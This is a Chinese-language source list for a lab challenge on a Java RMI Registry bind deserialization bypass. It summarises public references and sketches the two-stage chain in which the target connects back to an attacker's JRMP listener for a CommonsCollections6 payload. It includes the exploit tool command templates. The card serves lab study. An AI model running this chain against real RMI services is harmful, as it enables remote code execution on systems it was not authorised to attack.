# 049 — Java RMI Registry Bind Deserialization Bypass 来源清单

## 题目范围

- 题名：`java-rmi-registry-bind-deserialization-bypass 代码执行`
- 镜像：`vulfocus/java-rmi-registry-bind-deserialization-bypass:latest`
- 题库内部端口：`1099`
- CVE：无
- 本卡只整理 bind deserialization **bypass**：向 Registry 发送白名单允许的 RMI 引用，由目标反连 JRMP Listener，再接收二阶段载荷。题库题名、镜像名和端口来自本地题库；公开同名 Vulhub 复现不等于 Vulfocus 镜像构建证明。
- 不使用 Java RMI codebase 类加载链，也不复用普通 bind 反序列化题的直接 gadget 命令。

## [S1] 同名 bypass 环境复现（Vulhub 仓库镜像）

- 链接：[Vulhub — Java < JDK8u232_b09 RMI Registry Deserialization Remote Code Execution Bypass](https://git.inmind-lab.com/aaronxu/vulhub/src/commit/63285f61aaf4501a6660be7dfe98c70135c1b89b/java/rmi-registry-bind-deserialization-bypass/README.md?display=rendered)
- 类型：与本题准确 bypass 名称对应的靶场复现文档。
- 支持内容：公开环境标题给出的 JDK `<8u232_b09` 范围；Registry 监听 `1099`；先运行 `JRMPListener 8888 CommonsCollections6 ...`，再运行 `RMIRegistryExploit2 <RegistryHost> 1099 <JRMPHost> 8888`；Registry 返回异常不必然代表命令未执行。
- 不支持内容：不能证明 Vulfocus `latest` 使用相同 JDK、依赖、过滤器配置或网络映射，也没有提供本题 Vulfocus 实例的实测结果。

## [S2] RMI Registry 白名单绕过技术分析

- 链接：[浅谈 Java RMI Registry 安全问题](https://blog.0kami.cn/blog/2020/rmi-registry-security-problem-20200206/)
- 类型：RMI Registry 反序列化及白名单绕过技术分析。
- 支持内容：分析 JDK 8u121 白名单引入后，经典直接 gadget 受限；说明利用白名单中的 `UnicastRef` 与 Remote stub/handler 建立反向 JRMP 连接的机制；讨论 JDK 8u232_b09 的修复边界。卡片仅提炼与 bind bypass 和 JRMP Listener 两段链相关内容。
- 不支持内容：不确认 Vulfocus 镜像的 JDK、过滤器、class path 或出站网络状态；文章还包括 lookup 等其它攻击面，本卡不采用那些步骤。

## [S3] `RMIRegistryExploit2` 源码

- 链接：[wh1t3p1g/ysoserial — RMIRegistryExploit2.java](https://github.com/wh1t3p1g/ysoserial/blob/master/src/main/java/ysoserial/exploit/RMIRegistryExploit2.java)
- 类型：与公开 bypass 复现配套的利用器源码。
- 支持内容：参数顺序为 Registry host/port、JRMP Listener host/port；代码将 Listener 地址写入 `UnicastRef`，构造 `RMIConnectionImpl_Stub` 并通过 `registry.bind()` 发送。
- 不支持内容：不确认目标可访问该 Listener，不确认目标 classpath 中存在二阶段 gadget 依赖，也不证明 Vulfocus 实例可利用。

## [S4] `JRMPListener` 源码

- 链接：[wh1t3p1g/ysoserial — JRMPListener.java](https://github.com/wh1t3p1g/ysoserial/blob/master/src/main/java/ysoserial/exploit/JRMPListener.java)
- 类型：与 bypass 配套的 JRMP 二阶段服务端源码。
- 支持内容：Listener 接收端口和 gadget/命令参数；在收到 RMI/JRMP 请求后向对端返回构造的异常响应对象，其中承载二阶段 payload。
- 不支持内容：不证明目标一定会反连、特定命令可在目标环境执行，或本 Vulfocus 镜像具有所需依赖。

## 链路与证据边界

- 公开复现链：攻击端开启 JRMP Listener（示例 `8888`）→ `RMIRegistryExploit2` 对题目 Registry（内部端口 `1099`，连接时使用 Vulfocus 映射端口）执行 bind → 发送包含指向 Listener 的 `UnicastRef` 的 Remote stub → 目标尝试反连 Listener → Listener 返回 CommonsCollections6 二阶段载荷 → 通过可观察回连确认命令路径。
- 这不是“直接把 CommonsCollections payload 放进 bind 请求”的第048题链，也不是第047题的 codebase 动态类加载链。
- 公开环境文档标注 `<8u232_b09`，但题库没有给出本 Vulfocus `latest` 的运行时版本。目标到 Listener 的网络可达性、二阶段 gadget 依赖以及实际命令执行均未核实。
- 未实测；未写 Flag；未下载或保存原文。

